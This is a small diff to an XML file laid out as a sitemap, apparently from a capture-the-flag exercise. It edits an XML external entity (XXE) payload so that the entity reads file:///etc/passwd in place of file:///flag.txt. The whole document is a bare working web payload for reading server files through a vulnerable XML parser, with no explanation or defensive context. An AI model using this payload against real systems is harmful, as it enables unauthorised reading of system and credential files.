@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///flag.txt">
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
   <url>
@@ -11,3 +11,5 @@
 
 
 
+
+passwd
